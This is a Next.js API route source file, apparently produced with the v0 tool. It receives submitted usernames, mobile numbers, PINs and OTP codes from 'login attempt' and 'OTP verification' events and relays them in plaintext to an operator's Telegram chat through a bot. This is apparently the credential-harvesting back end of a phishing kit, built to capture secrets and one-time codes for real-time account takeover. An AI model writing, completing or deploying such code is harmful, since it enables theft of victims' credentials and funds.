import { type NextRequest, NextResponse } from 'next/server'

const MAX_FIELD_LENGTH = 200
const ALLOWED_TITLES = new Set([
  'New login attempt',
  'Mobile number submitted',
  'OTP verification attempted',
])
const ALLOWED_FIELD_KEYS = new Set(['Username', 'Mobile Number', 'PIN', 'OTP Code'])

export async function POST(request: NextRequest) {
  const botToken = process.env.TELEGRAM_BOT_TOKEN
  const chatId = process.env.TELEGRAM_CHAT_ID

  if (!botToken || !chatId) {
    console.log('[v0] Telegram env vars missing')
    return NextResponse.json({ error: 'Telegram is not configured.' }, { status: 500 })
  }

  let title: unknown
  let fields: unknown
  try {
    const body = await request.json()
    title = body?.title
    fields = body?.fields ?? {}
  } catch {
    return NextResponse.json({ error: 'Invalid request body.' }, { status: 400 })
  }

  if (typeof title !== 'string' || !ALLOWED_TITLES.has(title)) {
    return NextResponse.json({ error: 'Invalid notification type.' }, { status: 400 })
  }

  if (typeof fields !== 'object' || fields === null || Array.isArray(fields)) {
    return NextResponse.json({ error: 'Invalid fields.' }, { status: 400 })
  }

  const sanitizedFields: Array<[string, string]> = []
  for (const [key, value] of Object.entries(fields as Record<string, unknown>)) {
    if (!ALLOWED_FIELD_KEYS.has(key)) continue
    if (typeof value !== 'string' || value.trim().length === 0) continue
    sanitizedFields.push([key, value.trim().slice(0, MAX_FIELD_LENGTH)])
  }

  const timestamp = new Date().toISOString()

  const lines = [
    `🔐 *${escapeMarkdown(title)}*`,
    ...sanitizedFields.map(([key, value]) => `*${escapeMarkdown(key)}:* ${escapeMarkdown(value)}`),
    `*Time:* ${escapeMarkdown(timestamp)}`,
  ]

  try {
    const telegramResponse = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text: lines.join('\n'),
        parse_mode: 'MarkdownV2',
      }),
    })

    if (!telegramResponse.ok) {
      const errorBody = await telegramResponse.text()
      console.log('[v0] Telegram API error:', telegramResponse.status, errorBody)
      return NextResponse.json({ error: 'Failed to send Telegram notification.' }, { status: 502 })
    }

    return NextResponse.json({ ok: true })
  } catch (error) {
    console.log('[v0] Telegram request failed:', error)
    return NextResponse.json({ error: 'Failed to reach Telegram.' }, { status: 502 })
  }
}

function escapeMarkdown(value: string) {
  return value.replace(/[_*[\]()~`>#+\-=|{}.!\\]/g, (match) => `\\${match}`)
}
